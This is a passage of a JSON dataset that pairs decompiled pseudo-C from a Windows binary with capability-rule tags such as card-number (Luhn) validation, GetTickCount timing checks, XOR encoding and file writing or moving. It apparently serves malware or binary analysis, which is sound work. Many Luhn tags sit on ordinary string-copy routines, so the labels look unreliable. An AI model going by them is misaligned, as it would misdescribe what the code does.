unaff_EDI;\n    if (unaff_ESI[5] < 0x10) {\n        *(unaff_ESI + unaff_EDI) = 0;\n        return;\n    }\n    *(*unaff_ESI + unaff_EDI) = 0;\n    return;\n}\n",
        "token_count": 508
    },
    "00401410": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401410(int32_t **arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t **arg_8h_00;\n    int32_t **in_ECX;\n    int32_t **extraout_ECX;\n    int32_t **extraout_ECX_00;\n    int32_t **ppiVar1;\n    int32_t *unaff_EBX;\n    int32_t *piVar2;\n    \n    piVar2 = arg_8h[4];\n    ppiVar1 = arg_8h;\n    if (piVar2 < unaff_EBX) {\n        in_EAX = fcn.00406afa(\"invalid string position\");\n        ppiVar1 = extraout_ECX;\n    }\n    piVar2 = piVar2 - unaff_EBX;\n    if (in_EAX < piVar2) {\n        piVar2 = in_EAX;\n    }\n    if (in_ECX == ppiVar1) {\n        fcn.00401660();\n        fcn.00401660();\n        return;\n    }\n    if (piVar2 == 0xffffffff) {\n        fcn.00406aad(\"string too long\");\n        ppiVar1 = extraout_ECX_00;\n    }\n    if (in_ECX[5] < piVar2) {\n        fcn.004014f0();\n        ppiVar1 = arg_8h;\n        if (piVar2 == NULL) {\n            return;\n        }\n    }\n    else if (piVar2 == NULL) {\n        in_ECX[4] = NULL;\n        if (0xf < in_ECX[5]) {\n            **in_ECX = 0;\n            return;\n        }\n        *in_ECX = 0;\n        return;\n    }\n    if (0xf < ppiVar1[5]) {\n        ppiVar1 = *ppiVar1;\n    }\n    arg_8h_00 = in_ECX;\n    if (0xf < in_ECX[5]) {\n        arg_8h_00 = *in_ECX;\n    }\n    fcn.0040d0f0(arg_8h_00, ppiVar1 + unaff_EBX, piVar2);\n    in_ECX[4] = piVar2;\n    if (in_ECX[5] < 0x10) {\n        *(in_ECX + piVar2) = 0;\n        return;\n    }\n    *(*in_ECX + piVar2) = 0;\n    return;\n}\n",
        "token_count": 553
    },
    "00401660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401660(int32_t *param_1)\n\n{\n    int32_t **ppiVar1;\n    uint32_t in_EAX;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t *extraout_ECX;\n    int32_t **ppiVar4;\n    int32_t **unaff_ESI;\n    \n    piVar2 = unaff_ESI[4];\n    if (piVar2 < param_1) {\n        piVar2 = fcn.00406afa(\"invalid string position\");\n        param_1 = extraout_ECX;\n    }\n    uVar3 = piVar2 - param_1;\n    if (uVar3 < in_EAX) {\n        in_EAX = uVar3;\n    }\n    if (in_EAX != 0) {\n        ppiVar4 = unaff_ESI;\n        ppiVar1 = unaff_ESI;\n        if (0xf < unaff_ESI[5]) {\n            ppiVar4 = *unaff_ESI;\n            ppiVar1 = *unaff_ESI;\n        }\n        fcn.00406d00(ppiVar4 + param_1, ppiVar1 + param_1 + in_EAX, uVar3 - in_EAX);\n        piVar2 = unaff_ESI[4] - in_EAX;\n        unaff_ESI[4] = piVar2;\n        if (0xf < unaff_ESI[5]) {\n            *(*unaff_ESI + piVar2) = 0;\n            return;\n        }\n        *(unaff_ESI + piVar2) = 0;\n    }\n    return;\n}\n",
        "token_count": 366
    },
    "00401740": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "hash data using fnv/71d430608aea45068f0f63fc2cdc3004",
            "encode data using XOR"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00401740(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint unaff_ESI;\n    uint var_1390h;\n    uint32_t var_138ch;\n    uint32_t auStackY5004 [1247];\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040f990();\n    var_138ch = fcn.00406b68();\n    iVar1 = 1;\n    uVar2 = var_138ch;\n    do {\n        uVar2 = (uVar2 ^ uVar2 >> 0x1e) * 0x6c078965 + iVar1;\n        (&fcn.00401740::var_138ch)[iVar1] = uVar2;\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x270);\n    var_1390h = 0x270;\n    var_ch = 0x4017ab;\n    fcn.00401e30(&fcn.00401740::var_1390h);\n    fcn.00406bb6(unaff_ESI);\n    return;\n}\n",
        "token_count": 281
    },
    "00401990": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00401990(void)\n\n{\n    int32_t *in_EAX;\n    int32_t *piVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *unaff_ESI;\n    \n    *unaff_ESI = 0;\n    piVar1 = unaff_ESI + 1;\n    for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *piVar1 = 0;\n        piVar1 = piVar1 + 1;\n    }\n    iVar3 = *in_EAX;\n    iVar4 = 0;\n    *unaff_ESI = iVar3;\n    if (0 < iVar3) {\n        piVar1 = unaff_ESI + 1;\n        do {\n            *piVar1 = *((in_EAX - unaff_ESI) + piVar1);\n            iVar4 = iVar4 + 1;\n            piVar1 = piVar1 + 1;\n        } while (iVar4 < *unaff_ESI);\n    }\n    piVar1 = unaff_ESI + 0xc9;\n    *piVar1 = 0;\n    piVar2 = unaff_ESI + 0xca;\n    for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *piVar2 = 0;\n        piVar2 = piVar2 + 1;\n    }\n    iVar3 = in_EAX[0xc9];\n    iVar4 = 0;\n    *piVar1 = iVar3;\n    if (0 < iVar3) {\n        piVar2 = unaff_ESI + 0xca;\n        do {\n            *piVar2 = *(((in_EAX + 0xc9) - piVar1) + piVar2);\n            iVar4 = iVar4 + 1;\n            piVar2 = piVar2 + 1;\n        } while (iVar4 < *piVar1);\n    }\n    return;\n}\n",
        "token_count": 450
    },
    "00401e30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nint32_t __cdecl fcn.00401e30(uint arg_8h)\n\n{\n    double dVar1;\n    double dVar2;\n    int32_t in_ECX;\n    int32_t unaff_ESI;\n    float10 fVar3;\n    float10 fVar4;\n    int32_t var_14h;\n    uint var_8h;\n    \n    dVar1 = unaff_ESI;\n    if (unaff_ESI < 0) {\n        dVar1 = dVar1 + *0x419cc0;\n    }\n    dVar2 = in_ECX;\n    if (in_ECX < 0) {\n        dVar2 = dVar2 + *0x419cc0;\n    }\n    fVar3 = fcn.00401ec0(0);\n    fVar4 = dVar1;\n    fVar3 = dVar2 + ((fVar4 - dVar2) + *0x419cc8) * fVar3;\n    if (fVar4 < fVar3 != (fVar4 == fVar3)) {\n        return unaff_ESI;\n    }\n    var_14h = ROUND(fVar3);\n    return var_14h;\n}\n",
        "token_count": 278
    },
    "004023f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_334h\n\nvoid __cdecl fcn.004023f0(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *unaff_EBX;\n    int32_t *piVar4;\n    uint var_334h;\n    uint var_330h;\n    uint var_4h;\n    \n    piVar1 = fcn.00402310(in_ECX);\n    piVar4 = in_ECX;\n    for (iVar2 = 0xc9; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar4 = *piVar1;\n        piVar1 = piVar1 + 1;\n        piVar4 = piVar4 + 1;\n    }\n    *unaff_EBX = 0;\n    piVar1 = unaff_EBX + 1;\n    for (iVar2 = 200; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar1 = 0;\n        piVar1 = piVar1 + 1;\n    }\n    iVar2 = *in_ECX;\n    iVar3 = 0;\n    *unaff_EBX = iVar2;\n    if (0 < iVar2) {\n        piVar1 = unaff_EBX + 1;\n        do {\n            *piVar1 = *((in_ECX - unaff_EBX) + piVar1);\n            iVar3 = iVar3 + 1;\n            piVar1 = piVar1 + 1;\n        } while (iVar3 < *unaff_EBX);\n    }\n    fcn.00406bb6(in_ECX);\n    return;\n}\n",
        "token_count": 391
    },
    "004028c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004028c0(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t *unaff_ESI;\n    uint *puVar5;\n    uint in_stack_fffffcc8;\n    uint var_330h;\n    uint var_32ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x41b0e4 ^ &stack0xfffffffc;\n    iVar2 = *in_ECX;\n    iVar1 = 0;\n    puVar5 = &var_32ch;\n    for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    if (0 < iVar2) {\n        piVar4 = in_ECX + 1;\n        do {\n            (&var_32ch)[iVar1] = *piVar4;\n            iVar1 = iVar1 + 1;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 < iVar2);\n    }\n    if (arg_8h == 0) {\n        iVar1 = 0;\n        piVar4 = unaff_ESI + 1;\n        for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *piVar4 = 0;\n            piVar4 = piVar4 + 1;\n        }\n        *unaff_ESI = iVar2;\n        if (0 < iVar2) {\n            piVar4 = unaff_ESI + 1;\n            do {\n                *piVar4 = (&var_32ch)[iVar1];\n                iVar1 = iVar1 + 1;\n                piVar4 = piVar4 + 1;\n            } while (iVar1 < *unaff_ESI);\n            fcn.00406bb6(in_stack_fffffcc8);\n            return;\n        }\n    }\n    else {\n        iVar2 = fcn.004029b0(&var_32ch, iVar2);\n        iVar1 = 0;\n        piVar4 = unaff_ESI + 1;\n        for (iVar3 = 200; iVar3 != 0; iVar3 = iVar3 + -1) {\n            *piVar4 = 0;\n            piVar4 = piVar4 + 1;\n        }\n        *unaff_ESI = iVar2;\n        if (0 < iVar2) {\n            piVar4 = unaff_ESI + 1;\n            do {\n                *piVar4 = (&var_32ch)[iVar1];\n                iVar1 = iVar1 + 1;\n                piVar4 = piVar4 + 1;\n            } while (iVar1 < *unaff_ESI);\n        }\n    }\n    fcn.00406bb6(in_stack_fffffcc8);\n    return;\n}\n",
        "token_count": 665
    },
    "00402c00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402c00(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    \n    iVar1 = *arg_8h;\n    if (iVar1 == *in_EAX) {\n        iVar4 = 0;\n        if (0 < iVar1) {\n            piVar3 = in_EAX + 1;\n            do {\n                if (*((arg_8h - in_EAX) + piVar3) != *piVar3) goto code_r0x00402c3c;\n                iVar4 = iVar4 + 1;\n                piVar3 = piVar3 + 1;\n            } while (iVar4 < iVar1);\n        }\n    }\n    else {\ncode_r0x00402c3c:\n        cVar2 = fcn.00402b20();\n        if (cVar2 == '\\0') {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 235
    },
    "00404920": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00404920(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint *unaff_EBX;\n    \n    while (puVar1 = *unaff_EBX,  puVar1 != NULL) {\n        uVar2 = *puVar1;\n        if (puVar1[1] != 0) {\n            fcn.004072a9(puVar1[1]);\n        }\n        *puVar1 = 0;\n        puVar1[1] = 0;\n        fcn.004072a9(puVar1);\n        *unaff_EBX = uVar2;\n    }\n    return;\n}\n",
        "token_count": 145
    },
    "00404960": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404960(int16_t *arg_8h)\n\n{\n    uint32_t arg_ch;\n    int16_t iVar1;\n    int64_t iVar2;\n    uint *puVar3;\n    int16_t *piVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *unaff_EBX;\n    \n    puVar3 = fcn.00407305(8);\n    if (puVar3 != NULL) {\n        *puVar3 = 0;\n        puVar3[1] = 0;\n        piVar4 = arg_8h;\n        do {\n            iVar1 = *piVar4;\n            piVar4 = piVar4 + 1;\n        } while (iVar1 != 0);\n        iVar5 = piVar4 - (arg_8h + 1) >> 1;\n        if (-1 < iVar5) {\n            arg_ch = iVar5 + 1;\n            iVar2 = arg_ch * 2;\n            puVar6 = fcn.00406bab(-(iVar2 >> 0x20 != 0) | iVar2);\n            puVar3[1] = puVar6;\n            *puVar6 = 0;\n            fcn.00407a13(puVar3[1], arg_ch, arg_8h, 0x104);\n            *puVar3 = *unaff_EBX;\n            *unaff_EBX = puVar3;\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 332
    },
    "00406290": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406290(uint32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t **in_EAX;\n    uint32_t uVar2;\n    int32_t **ppiVar3;\n    int32_t **in_ECX;\n    int32_t *piVar4;\n    \n    if (in_EAX != NULL) {\n        piVar4 = in_ECX[5];\n        ppiVar3 = in_ECX;\n        if (0xf < piVar4) {\n            ppiVar3 = *in_ECX;\n        }\n        if (ppiVar3 <= in_EAX) {\n            ppiVar3 = in_ECX;\n            if (0xf < piVar4) {\n                ppiVar3 = *in_ECX;\n            }\n            if (in_EAX < in_ECX[4] + ppiVar3) {\n                if (piVar4 < 0x10) {\n                    fcn.00406840(in_ECX, in_EAX - in_ECX);\n                    return;\n                }\n                fcn.00406840(in_ECX, in_EAX - *in_ECX);\n                return;\n            }\n        }\n    }\n    piVar4 = in_ECX[4];\n    uVar2 = arg_8h;\n    if (-piVar4 - 1U <= arg_8h) {\n        uVar2 = fcn.00406aad(\"string too long\");\n    }\n    if (uVar2 != 0) {\n        piVar4 = piVar4 + uVar2;\n        cVar1 = fcn.004013c0();\n        if (cVar1 != '\\0') {\n            ppiVar3 = in_ECX;\n            if (0xf < in_ECX[5]) {\n                ppiVar3 = *in_ECX;\n            }\n            fcn.0040d0f0(in_ECX[4] + ppiVar3, in_EAX, arg_8h);\n            in_ECX[4] = piVar4;\n            if (0xf < in_ECX[5]) {\n                *(*in_ECX + piVar4) = 0;\n                return;\n            }\n            *(in_ECX + piVar4) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 494
    },
    "00406840": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406840(uint *arg_8h, uint32_t arg_ch)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t **ppiVar4;\n    uint32_t extraout_ECX;\n    uint32_t uVar5;\n    int32_t **unaff_EDI;\n    \n    uVar2 = arg_8h[4];\n    uVar5 = arg_ch;\n    if (uVar2 < arg_ch) {\n        uVar2 = fcn.00406afa(\"invalid string position\");\n        uVar5 = extraout_ECX;\n    }\n    if (uVar2 - uVar5 < in_EAX) {\n        in_EAX = uVar2 - uVar5;\n    }\n    piVar3 = unaff_EDI[4];\n    if (-piVar3 - 1U <= in_EAX) {\n        piVar3 = fcn.00406aad(\"string too long\");\n    }\n    if (in_EAX != 0) {\n        piVar3 = piVar3 + in_EAX;\n        cVar1 = fcn.004013c0();\n        if (cVar1 != '\\0') {\n            if (0xf < arg_8h[5]) {\n                arg_8h = *arg_8h;\n            }\n            ppiVar4 = unaff_EDI;\n            if (0xf < unaff_EDI[5]) {\n                ppiVar4 = *unaff_EDI;\n            }\n            fcn.0040d0f0(unaff_EDI[4] + ppiVar4, arg_8h + arg_ch, in_EAX);\n            unaff_EDI[4] = piVar3;\n            if (0xf < unaff_EDI[5]) {\n                *(*unaff_EDI + piVar3) = 0;\n                return;\n            }\n            *(unaff_EDI + piVar3) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 448
    },
    "00406a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406a70(uint arg_8h, uint arg_ch)\n\n{\n    uint in_EDX;\n    \n    fcn.00407def(in_EDX, 0x104, arg_8h, &arg_ch);\n    return;\n}\n",
        "token_count": 58
    },
    "00407385": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407385(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    fcn.00409b6f(arg_8h, arg_ch, arg_10h, 0, &arg_14h);\n    return;\n}\n",
        "token_count": 68
    },
    "00409b6f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00409b6f(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00409a79(fcn.0040d69a, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    if (iVar1 < 0) {\n        iVar1 = -1;\n    }\n    return iVar1;\n}\n",
        "token_count": 119
    },
    "0040a36c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a36c(uint arg_8h)\n\n{\n    fcn.0040a22c(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 43
    },
    "0040c4d9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040c4ed)\n// WARNING: Removing unreachable block (ram,0x0040c4f3)\n// WARNING: Removing unreachable block (ram,0x0040c4f5)\n\nvoid fcn.0040c4d9(void)\n\n{\n    return;\n}\n",
        "token_count": 71
    },
    "00410515": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00410515(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00411f58(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 110
    },
    "00414810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00414866)\n\nvoid fcn.00414810(void)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4147d8;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x41b0e4 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.004012f0(uVar1);\n    var_4h = 0;\n    fcn.00406b68();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 190
    },
    "004148c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00414916)\n\nvoid fcn.004148c0(void)\n\n{\n    uint32_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_28h;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4147d8;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x41b0e4 ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    fcn.004012f0(uVar1);\n    var_4h = 0;\n    fcn.00406b68();\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 191
    },
    "0040c64a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c64a(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.0040870b(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0040ff75": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0040ff75(void)\n\n{\n    *0x41be90 = (*_sym.imp.KERNEL32.dll_CreateFileW)(0x4173f4, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 65
    },
    "00406bab": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00406bab(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *apcStack20 [3];\n    char *pcStack8;\n    \n    do {\n        iVar2 = fcn.00407ae0(param_1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.004098b7(param_1);\n    } while (iVar2 != 0);\n    if ((*0x41c24c & 1) == 0) {\n        *0x41c24c = *0x41c24c | 1;\n        pcStack8 = \"bad allocation\";\n        fcn.00406bc5(&pcStack8);\n        *0x41c240 = vtable.std::bad_alloc.0;\n        fcn.00407c97(0x4149c1);\n    }\n    fcn.00406cdb(0x41c240);\n    apcStack20[0] = vtable.std::bad_alloc.0;\n    fcn.004083c3(apcStack20, 0x41a3e0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 273
    },
    "004097a1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004097a1(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040a940(0x41a158, 0xc);\n    fcn.0040cb38(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x41c5b8;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x41c5b4;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x004097e5;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0040870b(arg_8h_00);\ncode_r0x004097e5:\n        fcn.0040870b(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00409808();\n    fcn.0040a985();\n    return;\n}\n",
        "token_count": 400
    },
    "00405c60": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405c60(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint unaff_EDI;\n    uint arg_8h_00;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_8h_00 = 0;\n    iVar2 = (*_sym.imp.KERNEL32.dll_SetFilePointerEx)();\n    pcVar1 = _sym.imp.KERNEL32.dll_WriteFile;\n    if (iVar2 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)();\n        if (iVar2 != 0) {\n            (*pcVar1)();\n            fcn.00406bb6(unaff_EDI);\n            return;\n        }\n    }\n    fcn.00406bb6(arg_8h_00);\n    return;\n}\n",
        "token_count": 202
    },
    "00407f94": {
        "rules": [
            "move file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407f94(uint lpExistingFileName, uint lpNewFileName)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_MoveFileW)(lpExistingFileName, lpNewFileName);\n    if (iVar1 == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n    }\n    else {\n        iVar1 = 0;\n    }\n    if (iVar1 != 0) {\n        fcn.0040ab97(iVar1);\n        return 0xffffffff;\n    }\n    return 0;\n}\n",
        "token_count": 129
    }
}